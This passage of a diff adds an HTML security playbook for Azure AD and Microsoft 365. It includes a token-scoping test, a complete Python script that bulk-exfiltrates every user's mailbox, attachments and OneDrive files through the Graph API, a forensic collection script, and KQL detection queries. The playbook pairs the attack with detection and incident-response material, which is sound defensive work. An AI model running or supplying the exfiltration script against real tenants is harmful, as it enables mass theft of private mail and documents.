+        <span class="k">return</span> []
+
+    <span class="k">def</span> <span class="fn">test_token_for_resource</span>(<span class="v">self</span>, <span class="v">refresh_token</span>, <span class="v">client_id</span>, <span class="v">resource_url</span>):
+        <span class="s">"""Attempt to obtain an access token scoped to a different resource."""</span>
+        <span class="fn">print</span>(<span class="s">f"\n[*] Attempting token for resource: <span class="v">{resource_url}</span>"</span>)
+        <span class="c"># This tests if the refresh token can be exchanged for</span>
+        <span class="c"># a token targeting a different API/resource</span>
+        body = {
+            <span class="s">"grant_type"</span>: <span class="s">"refresh_token"</span>,
+            <span class="s">"client_id"</span>: <span class="v">client_id</span>,
+            <span class="s">"refresh_token"</span>: <span class="v">refresh_token</span>,
+            <span class="s">"scope"</span>: <span class="s">f"<span class="v">{resource_url}</span>/.default offline_access"</span>
+        }
+        resp = requests.post(
+            <span class="s">"https://login.microsoftonline.com/common/oauth2/v2.0/token"</span>,
+            data=body
+        )
+        <span class="k">if</span> resp.status_code == 200:
+            <span class="fn">print</span>(<span class="s">f"  [+] TOKEN OBTAINED for <span class="v">{resource_url}</span>"</span>)
+            <span class="k">return</span> resp.json()[<span class="s">"access_token"</span>]
+        <span class="k">else</span>:
+            <span class="fn">print</span>(<span class="s">f"  [-] Denied: <span class="v">{resp.json().get('error_description', '')[:100]}</span>"</span>)
+            <span class="k">return</span> <span class="k">None</span></pre>
+    </div>
+  </div>
+</div>
+</section>
+
+<!-- ════════════════════════════════════════════════════════ -->
+<!--  SECTION 07 — DATA EXFILTRATION                        -->
+<!-- ════════════════════════════════════════════════════════ -->
+<section class="section" id="s7">
+<div class="sec-head">
+  <span class="sec-num">07</span>
+  <h2 class="sec-title">Data Exfiltration</h2>
+</div>
+
+<div class="test-block">
+  <div class="test-header">
+    <div class="test-indicator ti-red"></div>
+    <div class="test-info">
+      <div class="test-tags">
+        <span class="tag tag-mitre">T1114.002</span>
+        <span class="tag tag-mitre">T1537</span>
+        <span class="tag tag-phase">EXFILTRATION</span>
+        <span class="tag tag-lang">PYTHON</span>
+      </div>
+      <h3>7.1 — Graph API Bulk Exfiltration (Mail + Files)</h3>
+      <p>Silently exfiltrate mailboxes and SharePoint/OneDrive data using application permissions via Graph API.</p>
+    </div>
+  </div>
+  <div class="test-body">
+    <h4>Script: M365 Data Exfiltration</h4>
+    <div class="code">
+      <div class="code-bar">
+        <span class="code-lang">Python 3</span>
+        <span class="code-file">exfiltrate_m365.py</span>
+      </div>
+<pre><span class="c">#!/usr/bin/env python3</span>
+<span class="c">"""
+M365 Data Exfiltration via Microsoft Graph API
+Uses application permissions (client_credentials) to access
+all user mailboxes and OneDrive files without user interaction.
+"""</span>
+
+<span class="k">import</span> requests, json, os, time
+<span class="k">from</span> datetime <span class="k">import</span> datetime
+
+<span class="k">class</span> <span class="fn">M365Exfiltrator</span>:
+    <span class="k">def</span> <span class="fn">__init__</span>(<span class="v">self</span>, <span class="v">access_token</span>, <span class="v">output_dir</span>=<span class="s">"./exfil"</span>):
+        <span class="v">self</span>.headers = {<span class="s">"Authorization"</span>: <span class="s">f"Bearer <span class="v">{access_token}</span>"</span>}
+        <span class="v">self</span>.graph = <span class="s">"https://graph.microsoft.com/v1.0"</span>
+        <span class="v">self</span>.output = <span class="v">output_dir</span>
+        os.makedirs(<span class="v">output_dir</span>, exist_ok=<span class="k">True</span>)
+        <span class="v">self</span>.stats = {<span class="s">"emails"</span>: 0, <span class="s">"files"</span>: 0, <span class="s">"bytes"</span>: 0}
+
+    <span class="k">def</span> <span class="fn">get_all_users</span>(<span class="v">self</span>):
+        <span class="s">"""Enumerate all users with mailboxes."""</span>
+        url = <span class="s">f"<span class="v">{self.graph}</span>/users?$top=999&amp;$select=id,displayName,mail,userPrincipalName"</span>
+        resp = requests.get(url, headers=<span class="v">self</span>.headers)
+        users = resp.json().get(<span class="s">"value"</span>, [])
+        <span class="fn">print</span>(<span class="s">f"[+] Discovered <span class="v">{len(users)}</span> users"</span>)
+        <span class="k">return</span> users
+
+    <span class="k">def</span> <span class="fn">exfil_mailbox</span>(<span class="v">self</span>, <span class="v">user_id</span>, <span class="v">user_name</span>, <span class="v">max_messages</span>=100):
+        <span class="s">"""Download emails from a user's mailbox."""</span>
+        <span class="fn">print</span>(<span class="s">f"\n[*] Exfiltrating mailbox: <span class="v">{user_name}</span>"</span>)
+        user_dir = os.path.join(<span class="v">self</span>.output, <span class="s">"mail"</span>, user_name.replace(<span class="s">"@"</span>, <span class="s">"_at_"</span>))
+        os.makedirs(user_dir, exist_ok=<span class="k">True</span>)
+
+        url = <span class="s">f"<span class="v">{self.graph}</span>/users/<span class="v">{user_id}</span>/messages"</span>
+        url += <span class="s">f"?$top=50&amp;$select=subject,from,toRecipients,body,receivedDateTime,hasAttachments"</span>
+        url += <span class="s">"&amp;$orderby=receivedDateTime desc"</span>
+
+        count = 0
+        <span class="k">while</span> url <span class="k">and</span> count &lt; <span class="v">max_messages</span>:
+            resp = requests.get(url, headers=<span class="v">self</span>.headers)
+            <span class="k">if</span> resp.status_code != 200:
+                <span class="fn">print</span>(<span class="s">f"  [-] Access denied or error: <span class="v">{resp.status_code}</span>"</span>)
+                <span class="k">break</span>
+
+            data = resp.json()
+            messages = data.get(<span class="s">"value"</span>, [])
+
+            <span class="k">for</span> msg <span class="k">in</span> messages:
+                count += 1
+                filename = <span class="s">f"<span class="v">{count:04d}</span>_<span class="v">{msg['receivedDateTime'][:10]}</span>.json"</span>
+                filepath = os.path.join(user_dir, filename)
+                <span class="k">with</span> <span class="fn">open</span>(filepath, <span class="s">"w"</span>) <span class="k">as</span> f:
+                    json.dump(msg, f, indent=2)
+                <span class="v">self</span>.stats[<span class="s">"emails"</span>] += 1
+
+                <span class="c"># Download attachments if present</span>
+                <span class="k">if</span> msg.get(<span class="s">"hasAttachments"</span>):
+                    <span class="v">self</span>._download_attachments(user_id, msg[<span class="s">"id"</span>], user_dir)
+
+            url = data.get(<span class="s">"@odata.nextLink"</span>)
+            time.sleep(0.5)  <span class="c"># Rate limit courtesy</span>
+
+        <span class="fn">print</span>(<span class="s">f"  [+] Downloaded <span class="v">{count}</span> emails"</span>)
+
+    <span class="k">def</span> <span class="fn">_download_attachments</span>(<span class="v">self</span>, <span class="v">user_id</span>, <span class="v">message_id</span>, <span class="v">output_dir</span>):
+        <span class="s">"""Download message attachments."""</span>
+        url = <span class="s">f"<span class="v">{self.graph}</span>/users/<span class="v">{user_id}</span>/messages/<span class="v">{message_id}</span>/attachments"</span>
+        resp = requests.get(url, headers=<span class="v">self</span>.headers)
+        <span class="k">if</span> resp.status_code == 200:
+            <span class="k">for</span> att <span class="k">in</span> resp.json().get(<span class="s">"value"</span>, []):
+                <span class="k">if</span> att.get(<span class="s">"contentBytes"</span>):
+                    <span class="k">import</span> base64
+                    filepath = os.path.join(output_dir, <span class="s">f"att_<span class="v">{att['name']}</span>"</span>)
+                    <span class="k">with</span> <span class="fn">open</span>(filepath, <span class="s">"wb"</span>) <span class="k">as</span> f:
+                        f.write(base64.b64decode(att[<span class="s">"contentBytes"</span>]))
+                    <span class="v">self</span>.stats[<span class="s">"files"</span>] += 1
+
+    <span class="k">def</span> <span class="fn">exfil_onedrive</span>(<span class="v">self</span>, <span class="v">user_id</span>, <span class="v">user_name</span>):
+        <span class="s">"""List and download OneDrive files."""</span>
+        <span class="fn">print</span>(<span class="s">f"\n[*] Exfiltrating OneDrive: <span class="v">{user_name}</span>"</span>)
+        user_dir = os.path.join(<span class="v">self</span>.output, <span class="s">"onedrive"</span>, user_name.replace(<span class="s">"@"</span>, <span class="s">"_at_"</span>))
+        os.makedirs(user_dir, exist_ok=<span class="k">True</span>)
+
+        url = <span class="s">f"<span class="v">{self.graph}</span>/users/<span class="v">{user_id}</span>/drive/root/children"</span>
+        resp = requests.get(url, headers=<span class="v">self</span>.headers)
+        <span class="k">if</span> resp.status_code != 200:
+            <span class="fn">print</span>(<span class="s">f"  [-] OneDrive access denied: <span class="v">{resp.status_code}</span>"</span>)
+            <span class="k">return</span>
+
+        items = resp.json().get(<span class="s">"value"</span>, [])
+        <span class="k">for</span> item <span class="k">in</span> items:
+            <span class="k">if</span> <span class="s">"file"</span> <span class="k">in</span> item:
+                size = item.get(<span class="s">"size"</span>, 0)
+                <span class="fn">print</span>(<span class="s">f"  → <span class="v">{item['name']}</span> (<span class="v">{size/1024:.1f}</span> KB)"</span>)
+                <span class="c"># Download the file</span>
+                dl_url = <span class="s">f"<span class="v">{self.graph}</span>/users/<span class="v">{user_id}</span>/drive/items/<span class="v">{item['id']}</span>/content"</span>
+                dl_resp = requests.get(dl_url, headers=<span class="v">self</span>.headers)
+                <span class="k">if</span> dl_resp.status_code == 200:
+                    filepath = os.path.join(user_dir, item[<span class="s">"name"</span>])
+                    <span class="k">with</span> <span class="fn">open</span>(filepath, <span class="s">"wb"</span>) <span class="k">as</span> f:
+                        f.write(dl_resp.content)
+                    <span class="v">self</span>.stats[<span class="s">"files"</span>] += 1
+                    <span class="v">self</span>.stats[<span class="s">"bytes"</span>] += size
+            <span class="k">elif</span> <span class="s">"folder"</span> <span class="k">in</span> item:
+                <span class="fn">print</span>(<span class="s">f"  📁 <span class="v">{item['name']}</span>/ (folder — recurse for full exfil)"</span>)
+
+    <span class="k">def</span> <span class="fn">run_full_exfil</span>(<span class="v">self</span>, <span class="v">target_users</span>=<span class="k">None</span>):
+        <span class="s">"""Execute full exfiltration across all or specified users."""</span>
+        <span class="fn">print</span>(<span class="s">"="</span> * 60)
+        <span class="fn">print</span>(<span class="s">"  M365 DATA EXFILTRATION"</span>)
+        <span class="fn">print</span>(<span class="s">"="</span> * 60)
+
+        users = <span class="v">target_users</span> <span class="k">or</span> <span class="v">self</span>.get_all_users()
+        <span class="k">for</span> user <span class="k">in</span> users:
+            upn = user.get(<span class="s">"userPrincipalName"</span>, user.get(<span class="s">"id"</span>))
+            uid = user[<span class="s">"id"</span>]
+            <span class="v">self</span>.exfil_mailbox(uid, upn)
+            <span class="v">self</span>.exfil_onedrive(uid, upn)
+
+        <span class="fn">print</span>(<span class="s">f"\n{'='*60}"</span>)
+        <span class="fn">print</span>(<span class="s">f"[✓] EXFIL COMPLETE"</span>)
+        <span class="fn">print</span>(<span class="s">f"    Emails: <span class="v">{self.stats['emails']}</span>"</span>)
+        <span class="fn">print</span>(<span class="s">f"    Files:  <span class="v">{self.stats['files']}</span>"</span>)
+        <span class="fn">print</span>(<span class="s">f"    Data:   <span class="v">{self.stats['bytes']/1024/1024:.2f}</span> MB"</span>)
+        <span class="fn">print</span>(<span class="s">f"    Output: <span class="v">{self.output}</span>"</span>)</pre>
+    </div>
+  </div>
+</div>
+</section>
+
+<!-- ════════════════════════════════════════════════════════ -->
+<!--  SECTION 08 — ARTIFACT COLLECTION                      -->
+<!-- ════════════════════════════════════════════════════════ -->
+<section class="section" id="s8">
+<div class="sec-head">
+  <span class="sec-num">08</span>
+  <h2 class="sec-title">Forensic Artifact Collection</h2>
+</div>
+
+<div class="test-block">
+  <div class="test-header">
+    <div class="test-indicator ti-blue"></div>
+    <div class="test-info">
+      <div class="test-tags">
+        <span class="tag tag-phase">DFIR</span>
+        <span class="tag tag-lang">POWERSHELL</span>
+        <span class="tag tag-sev">BLUE TEAM</span>
+      </div>
+      <h3>8.1 — Post-Incident Artifact Collection Script</h3>
+      <p>Comprehensive evidence collection covering every artifact that would remain after an attacker attempts cleanup.</p>
+    </div>
+  </div>
+  <div class="test-body">
+    <h4>Script: Full Artifact Sweep</h4>
+    <div class="code">
+      <div class="code-bar">
+        <span class="code-lang">PowerShell</span>
+        <span class="code-file">Collect-CloudArtifacts.ps1</span>
+      </div>
+<pre><span class="c">########################################################################</span>
+<span class="c"># Collect-CloudArtifacts.ps1</span>
+<span class="c"># Post-compromise forensic collection for Azure AD / M365.</span>
+<span class="c"># Collects all artifacts that survive attacker cleanup attempts.</span>
+<span class="c">########################################################################</span>
+
+<span class="k">param</span>(
+    [<span class="p">string</span>]<span class="v">$OutputDir</span>     = <span class="s">".\IR_Collection_$(Get-Date -Format 'yyyyMMdd_HHmm')"</span>,
+    [<span class="p">int</span>]<span class="v">$DaysBack</span>         = 30,
+    [<span class="p">string</span>]<span class="v">$SuspectUserId</span>  = <span class="s">""</span>,
+    [<span class="p">string</span>]<span class="v">$SuspectAppId</span>   = <span class="s">""</span>
+)
+
+<span class="c"># ── Setup ──</span>
+<span class="fn">New-Item</span> <span class="k">-ItemType</span> Directory <span class="k">-Path</span> <span class="v">$OutputDir</span> <span class="k">-Force</span> | <span class="fn">Out-Null</span>
+<span class="v">$startDate</span> = (<span class="fn">Get-Date</span>).AddDays(-<span class="v">$DaysBack</span>).ToString(<span class="s">"yyyy-MM-ddTHH:mm:ssZ"</span>)
+<span class="fn">Write-Host</span> <span class="s">"[*] Collection window: Last <span class="v">$DaysBack</span> days"</span>
+<span class="fn">Write-Host</span> <span class="s">"[*] Output directory: <span class="v">$OutputDir</span>`n"</span>
+
+<span class="fn">Connect-MgGraph</span> <span class="k">-Scopes</span> @(
+    <span class="s">"AuditLog.Read.All"</span>, <span class="s">"Directory.Read.All"</span>,
+    <span class="s">"Application.Read.All"</span>, <span class="s">"Policy.Read.All"</span>
+)
+
+<span class="c"># ══════════════════════════════════════════</span>
+<span class="c"># ARTIFACT 1: Azure AD Audit Logs</span>
+<span class="c"># Survives: app deletion, role removal, cleanup</span>
+<span class="c"># ══════════════════════════════════════════</span>
+<span class="fn">Write-Host</span> <span class="s">"[1/7] Collecting Azure AD Audit Logs..."</span>
+<span class="v">$suspiciousOps</span> = @(
+    <span class="s">"Add service principal credentials"</span>,
+    <span class="s">"Update application – Certificates and secrets management"</span>,
+    <span class="s">"Consent to application"</span>,
+    <span class="s">"Add delegated permission grant"</span>,
+    <span class="s">"Add app role assignment grant to user"</span>,
+    <span class="s">"Add member to role"</span>,
+    <span class="s">"Add owner to application"</span>,
+    <span class="s">"Add federated identity credential"</span>,
+    <span class="s">"Remove member from role"</span>,
+    <span class="s">"Add application"</span>,
+    <span class="s">"Update conditional access policy"</span>,
+    <span class="s">"Delete conditional access policy"</span>
+)
+
+<span class="v">$auditLogs</span> = @()
+<span class="k">foreach</span> (<span class="v">$op</span> <span class="k">in</span> <span class="v">$suspiciousOps</span>) {
+    <span class="v">$filter</span> = <span class="s">"activityDisplayName eq '<span class="v">$op</span>' and activityDateTime ge <span class="v">$startDate</span>"</span>
+    <span class="k">try</span> {
+        <span class="v">$logs</span> = <span class="fn">Get-MgAuditLogDirectoryAudit</span> <span class="k">-Filter</span> <span class="v">$filter</span> <span class="k">-All</span>
+        <span class="k">if</span> (<span class="v">$logs</span>) {
+            <span class="fn">Write-Host</span> <span class="s">"    [!] <span class="v">$($logs.Count)</span> events: <span class="v">$op</span>"</span> <span class="k">-ForegroundColor</span> Yellow
+            <span class="v">$auditLogs</span> += <span class="v">$logs</span>
+        }
+    } <span class="k">catch</span> { }
+}
+<span class="v">$auditLogs</span> | <span class="fn">ConvertTo-Json</span> <span class="k">-Depth</span> 15 |
+    <span class="fn">Out-File</span> <span class="s">"<span class="v">$OutputDir</span>\01_AuditLogs.json"</span>
+<span class="fn">Write-Host</span> <span class="s">"    Total suspicious events: <span class="v">$($auditLogs.Count)</span>`n"</span>
+
+<span class="c"># ══════════════════════════════════════════</span>
+<span class="c"># ARTIFACT 2: Sign-In Logs (User + SP)</span>
+<span class="c"># ══════════════════════════════════════════</span>
+<span class="fn">Write-Host</span> <span class="s">"[2/7] Collecting Sign-In Logs..."</span>
+
+<span class="c"># User sign-ins</span>
+<span class="v">$signInFilter</span> = <span class="s">"createdDateTime ge <span class="v">$startDate</span>"</span>
+<span class="k">if</span> (<span class="v">$SuspectUserId</span>) {
+    <span class="v">$signInFilter</span> += <span class="s">" and userId eq '<span class="v">$SuspectUserId</span>'"</span>
+}
+<span class="v">$signIns</span> = <span class="fn">Get-MgAuditLogSignIn</span> <span class="k">-Filter</span> <span class="v">$signInFilter</span> <span class="k">-All</span> <span class="k">-Top</span> 5000
+<span class="v">$signIns</span> | <span class="fn">ConvertTo-Json</span> <span class="k">-Depth</span> 10 |
+    <span class="fn">Out-File</span> <span class="s">"<span class="v">$OutputDir</span>\02_UserSignIns.json"</span>
+<span class="fn">Write-Host</span> <span class="s">"    User sign-ins: <span class="v">$($signIns.Count)</span>"</span>
+
+<span class="c"># Service principal sign-ins (critical — often missed)</span>
+<span class="k">try</span> {
+    <span class="v">$spSignIns</span> = <span class="fn">Invoke-MgGraphRequest</span> <span class="k">-Method</span> GET `
+        <span class="k">-Uri</span> <span class="s">"v1.0/auditLogs/signIns?`$filter=signInEventTypes/any(t: t eq 'servicePrincipal') and createdDateTime ge <span class="v">$startDate</span>"</span>
+    <span class="v">$spSignIns</span>.value | <span class="fn">ConvertTo-Json</span> <span class="k">-Depth</span> 10 |
+        <span class="fn">Out-File</span> <span class="s">"<span class="v">$OutputDir</span>\02_SPSignIns.json"</span>
+    <span class="fn">Write-Host</span> <span class="s">"    SP sign-ins:   <span class="v">$($spSignIns.value.Count)</span>"</span>
+} <span class="k">catch</span> {
+    <span class="fn">Write-Host</span> <span class="s">"    [!] SP sign-in logs require P1/P2 license"</span>
+}
+
+<span class="c"># ══════════════════════════════════════════</span>
+<span class="c"># ARTIFACT 3: All App Registrations + Credentials</span>
+<span class="c"># ══════════════════════════════════════════</span>
+<span class="fn">Write-Host</span> <span class="s">"`n[3/7] Collecting App Registrations &amp; Credentials..."</span>
+<span class="v">$apps</span> = <span class="fn">Get-MgApplication</span> <span class="k">-All</span> <span class="k">-Property</span> `
+    <span class="s">"Id,AppId,DisplayName,PasswordCredentials,KeyCredentials,CreatedDateTime,RequiredResourceAccess"</span>
+
+<span class="v">$appReport</span> = <span class="v">$apps</span> | <span class="fn">ForEach-Object</span> {
+    @{
+        DisplayName        = <span class="v">$_</span>.DisplayName
+        AppId              = <span class="v">$_</span>.AppId
+        Created            = <span class="v">$_</span>.CreatedDateTime
+        SecretCount        = <span class="v">$_</span>.PasswordCredentials.Count
+        CertCount          = <span class="v">$_</span>.KeyCredentials.Count
+        Secrets            = <span class="v">$_</span>.PasswordCredentials | <span class="fn">Select-Object</span> DisplayName, StartDateTime, EndDateTime, KeyId
+        Certs              = <span class="v">$_</span>.KeyCredentials | <span class="fn">Select-Object</span> DisplayName, StartDateTime, EndDateTime, KeyId, Type
+    }
+}
+<span class="v">$appReport</span> | <span class="fn">ConvertTo-Json</span> <span class="k">-Depth</span> 10 |
+    <span class="fn">Out-File</span> <span class="s">"<span class="v">$OutputDir</span>\03_AppRegistrations.json"</span>
+<span class="fn">Write-Host</span> <span class="s">"    Apps collected: <span class="v">$($apps.Count)</span>"</span>
+
+<span class="c"># ══════════════════════════════════════════</span>
+<span class="c"># ARTIFACT 4: OAuth Permission Grants</span>
+<span class="c"># ══════════════════════════════════════════</span>
+<span class="fn">Write-Host</span> <span class="s">"`n[4/7] Collecting OAuth Permission Grants..."</span>
+<span class="v">$oauthGrants</span> = <span class="fn">Get-MgOauth2PermissionGrant</span> <span class="k">-All</span>
+<span class="v">$oauthGrants</span> | <span class="fn">ConvertTo-Json</span> <span class="k">-Depth</span> 5 |
+    <span class="fn">Out-File</span> <span class="s">"<span class="v">$OutputDir</span>\04_OAuthGrants.json"</span>
+<span class="fn">Write-Host</span> <span class="s">"    Delegated grants: <span class="v">$($oauthGrants.Count)</span>"</span>
+
+<span class="c"># Flag high-risk grants</span>
+<span class="v">$riskyScopes</span> = <span class="s">"Mail.Read|Mail.ReadWrite|Mail.Send|Files.ReadWrite|Directory.ReadWrite"</span>
+<span class="v">$risky</span> = <span class="v">$oauthGrants</span> | <span class="fn">Where-Object</span> { <span class="v">$_</span>.Scope <span class="k">-match</span> <span class="v">$riskyScopes</span> }
+<span class="k">foreach</span> (<span class="v">$g</span> <span class="k">in</span> <span class="v">$risky</span>) {
+    <span class="fn">Write-Host</span> <span class="s">"    [!] RISKY: ClientId=<span class="v">$($g.ClientId)</span> Scope=<span class="v">$($g.Scope)</span>"</span> <span class="k">-ForegroundColor</span> Red
+}
+
+<span class="c"># ══════════════════════════════════════════</span>
+<span class="c"># ARTIFACT 5: Federated Identity Credentials</span>
+<span class="c"># ══════════════════════════════════════════</span>
+<span class="fn">Write-Host</span> <span class="s">"`n[5/7] Collecting Federated Identity Credentials..."</span>
+<span class="v">$fedCreds</span> = @()
+<span class="k">foreach</span> (<span class="v">$app</span> <span class="k">in</span> <span class="v">$apps</span>) {
+    <span class="v">$fics</span> = <span class="fn">Get-MgApplicationFederatedIdentityCredential</span> <span class="k">-ApplicationId</span> <span class="v">$app</span>.Id <span class="k">-ErrorAction</span> SilentlyContinue
+    <span class="k">foreach</span> (<span class="v">$fic</span> <span class="k">in</span> <span class="v">$fics</span>) {
+        <span class="fn">Write-Host</span> <span class="s">"    [!] FIC on <span class="v">$($app.DisplayName)</span>: <span class="v">$($fic.Issuer)</span> / <span class="v">$($fic.Subject)</span>"</span> <span class="k">-ForegroundColor</span> Yellow
+        <span class="v">$fedCreds</span> += @{ App = <span class="v">$app</span>.DisplayName; AppId = <span class="v">$app</span>.AppId; FIC = <span class="v">$fic</span> }
+    }
+}
+<span class="v">$fedCreds</span> | <span class="fn">ConvertTo-Json</span> <span class="k">-Depth</span> 10 |
+    <span class="fn">Out-File</span> <span class="s">"<span class="v">$OutputDir</span>\05_FederatedCredentials.json"</span>
+
+<span class="c"># ══════════════════════════════════════════</span>
+<span class="c"># ARTIFACT 6: Privileged Role Membership Timeline</span>
+<span class="c"># ══════════════════════════════════════════</span>
+<span class="fn">Write-Host</span> <span class="s">"`n[6/7] Collecting Privileged Role Assignments..."</span>
+<span class="v">$roleAssignments</span> = <span class="fn">Get-MgRoleManagementDirectoryRoleAssignment</span> <span class="k">-All</span>
+<span class="v">$roleAssignments</span> | <span class="fn">ConvertTo-Json</span> <span class="k">-Depth</span> 5 |
+    <span class="fn">Out-File</span> <span class="s">"<span class="v">$OutputDir</span>\06_RoleAssignments.json"</span>
+<span class="fn">Write-Host</span> <span class="s">"    Active assignments: <span class="v">$($roleAssignments.Count)</span>"</span>
+
+<span class="c"># ══════════════════════════════════════════</span>
+<span class="c"># ARTIFACT 7: Conditional Access Policies (snapshot)</span>
+<span class="c"># ══════════════════════════════════════════</span>
+<span class="fn">Write-Host</span> <span class="s">"`n[7/7] Snapshotting Conditional Access Policies..."</span>
+<span class="v">$caPolicies</span> = <span class="fn">Get-MgIdentityConditionalAccessPolicy</span> <span class="k">-All</span>
+<span class="v">$caPolicies</span> | <span class="fn">ConvertTo-Json</span> <span class="k">-Depth</span> 15 |
+    <span class="fn">Out-File</span> <span class="s">"<span class="v">$OutputDir</span>\07_ConditionalAccess.json"</span>
+<span class="fn">Write-Host</span> <span class="s">"    CA Policies: <span class="v">$($caPolicies.Count)</span>"</span>
+
+<span class="c"># ── Summary ──</span>
+<span class="fn">Write-Host</span> <span class="s">"`n$('='*60)"</span>
+<span class="fn">Write-Host</span> <span class="s">"[✓] COLLECTION COMPLETE"</span> <span class="k">-ForegroundColor</span> Green
+<span class="fn">Write-Host</span> <span class="s">"    Output: <span class="v">$OutputDir</span>"</span>
+<span class="fn">Write-Host</span> <span class="s">"    Files:  <span class="v">$(Get-ChildItem $OutputDir -File | Measure-Object | Select-Object -Exp Count)</span>"</span>
+<span class="fn">Write-Host</span> <span class="s">"$('='*60)"</span>
+<span class="fn">Disconnect-MgGraph</span></pre>
+    </div>
+  </div>
+</div>
+</section>
+
+<!-- ════════════════════════════════════════════════════════ -->
+<!--  SECTION 09 — DETECTION ENGINEERING                    -->
+<!-- ════════════════════════════════════════════════════════ -->
+<section class="section" id="s9">
+<div class="sec-head">
+  <span class="sec-num">09</span>
+  <h2 class="sec-title">Detection Engineering (KQL)</h2>
+</div>
+
+<div class="test-block">
+  <div class="test-header">
+    <div class="test-indicator ti-green"></div>
+    <div class="test-info">
+      <div class="test-tags">
+        <span class="tag tag-phase">DETECTION</span>
+        <span class="tag tag-lang">KQL</span>
+        <span class="tag tag-sev">BLUE TEAM</span>
+      </div>
+      <h3>9.1 — Sentinel / Log Analytics Detection Queries</h3>
+      <p>KQL queries to detect every technique in this playbook. Deploy as Sentinel Analytic Rules or use for threat hunting.</p>
+    </div>
+  </div>
+  <div class="test-body">
+
+    <h4>Detection: Credential Injection on Service Principal</h4>
+    <div class="code">
+      <div class="code-bar">
+        <span class="code-lang">KQL</span>
+        <span class="code-file">detect_sp_cred_injection.kql</span>
+      </div>
+<pre><span class="c">// Detect new credentials added to app registrations / service principals</span>
+<span class="c">// Maps to: T1098.003 — Additional Cloud Credentials</span>
+<span class="c">// Severity: HIGH — This is the #1 persistence mechanism</span>
+
+<span class="k">AuditLogs</span>
+| <span class="fn">where</span> TimeGenerated > ago(24h)
+| <span class="fn">where</span> OperationName <span class="k">in</span> (
+    <span class="s">"Add service principal credentials"</span>,
+    <span class="s">"Update application – Certificates and secrets management"</span>,
+    <span class="s">"Add application key credentials"</span>,
+    <span class="s">"Add application password credentials"</span>
+  )
+| <span class="fn">extend</span> Actor = tostring(InitiatedBy.user.userPrincipalName)
+| <span class="fn">extend</span> ActorIP = tostring(InitiatedBy.user.ipAddress)
+| <span class="fn">extend</span> TargetApp = tostring(TargetResources[0].displayName)
+| <span class="fn">extend</span> TargetAppId = tostring(TargetResources[0].id)
+| <span class="fn">extend</span> KeyDescription = tostring(TargetResources[0].modifiedProperties[0].newValue)
+| <span class="fn">project</span> TimeGenerated, OperationName, Actor, ActorIP,
+         TargetApp, TargetAppId, KeyDescription, CorrelationId
+| <span class="fn">sort by</span> TimeGenerated <span class="k">desc</span></pre>
+    </div>
+
+    <h4>Detection: Illicit Consent Grant</h4>
+    <div class="code">
+      <div class="code-bar">
+        <span class="code-lang">KQL</span>
+        <span class="code-file">detect_consent_grant.kql</span>
+      </div>
+<pre><span class="c">// Detect OAuth consent grants — especially to unknown/external apps</span>
+<span class="c">// Maps to: T1098.003 — Illicit Consent Grant</span>
+
+<span class="k">AuditLogs</span>
+| <span class="fn">where</span> TimeGenerated > ago(7d)
+| <span class="fn">where</span> OperationName == <span class="s">"Consent to application"</span>
+| <span class="fn">extend</span> ConsentingUser = tostring(InitiatedBy.user.userPrincipalName)
+| <span class="fn">extend</span> AppName = tostring(TargetResources[0].displayName)
+| <span class="fn">extend</span> AppId = tostring(TargetResources[0].id)
+| <span class="fn">extend</span> Permissions = tostring(TargetResources[0].modifiedProperties)
+| <span class="fn">where</span> Permissions has_any (<span class="s">"Mail.Read"</span>, <span class="s">"Mail.ReadWrite"</span>, <span class="s">"Mail.Send"</span>,
+    <span class="s">"Files.ReadWrite"</span>, <span class="s">"Directory.ReadWrite"</span>, <span class="s">"offline_access"</span>)
+| <span class="fn">project</span> TimeGenerated, ConsentingUser, AppName, AppId, Permissions
+| <span class="fn">sort by</span> TimeGenerated <span class="k">desc</span></pre>
+    </div>
+
+    <h4>Detection: Federated Identity Credential Backdoor</h4>
+    <div class="code">
+      <div class="code-bar">
+        <span class="code-lang">KQL</span>
+        <span class="code-file">detect_federated_backdoor.kql</span>
+      </div>
+<pre><span class="c">// Detect addition of federated identity credentials (external IdP backdoors)</span>
+<span class="c">// This is one of the stealthiest persistence mechanisms</span>
+
+<span class="k">AuditLogs</span>
+| <span class="fn">where</span> TimeGenerated > ago(30d)
+| <span class="fn">where</span> OperationName == <span class="s">"Add federated identity credential"</span>
+| <span class="fn">extend</span> Actor = tostring(InitiatedBy.user.userPrincipalName)
+| <span class="fn">extend</span> ActorApp = tostring(InitiatedBy.app.displayName)
+| <span class="fn">extend</span> TargetApp = tostring(TargetResources[0].displayName)
+| <span class="fn">extend</span> FICDetails = tostring(TargetResources[0].modifiedProperties)
+| <span class="fn">project</span> TimeGenerated, Actor, ActorApp, TargetApp, FICDetails, CorrelationId
+| <span class="fn">sort by</span> TimeGenerated <span class="k">desc</span></pre>
+    </div>
+
+    <h4>Detection: Suspicious Mail Rules (BEC Indicator)</h4>
+    <div class="code">
+      <div class="code-bar">
+        <span class="code-lang">KQL</span>
+        <span class="code-file">detect_mail_rules.kql</span>
+      </div>
+<pre><span class="c">// Detect inbox rules with external forwarding or deletion actions</span>
+<span class="c">// Maps to: T1114.003, T1098.002</span>
+
+<span class="k">OfficeActivity</span>
+| <span class="fn">where</span> TimeGenerated > ago(7d)
+| <span class="fn">where</span> Operation <span class="k">in</span> (<span class="s">"New-InboxRule"</span>, <span class="s">"Set-InboxRule"</span>, <span class="s">"Enable-InboxRule"</span>)
+| <span class="fn">extend</span> RuleParams = tostring(Parameters)
+| <span class="fn">where</span> RuleParams has_any (<span class="s">"ForwardTo"</span>, <span class="s">"RedirectTo"</span>, <span class="s">"ForwardAsAttachmentTo"</span>,
+    <span class="s">"DeleteMessage"</span>, <span class="s">"MoveToFolder"</span>)
+| <span class="fn">extend</span> ExternalForward = extract(<span class="s">"ForwardTo.*?([\\w.-]+@[\\w.-]+)"</span>, 1, RuleParams)
+| <span class="fn">project</span> TimeGenerated, UserId, Operation, ExternalForward,
+         RuleParams, ClientIP, ClientInfoString
+| <span class="fn">sort by</span> TimeGenerated <span class="k">desc</span>
+
+<span class="c">// ── Also check Exchange transport rules for org-wide forwarding ──</span>
+<span class="k">OfficeActivity</span>
+| <span class="fn">where</span> TimeGenerated > ago(30d)
+| <span class="fn">where</span> Operation <span class="k">in</span> (<span class="s">"New-TransportRule"</span>, <span class="s">"Set-TransportRule"</span>)
+| <span class="fn">extend</span> RuleDetails = tostring(Parameters)
+| <span class="fn">where</span> RuleDetails has_any (<span class="s">"BlindCopyTo"</span>, <span class="s">"RedirectMessageTo"</span>, <span class="s">"CopyTo"</span>)
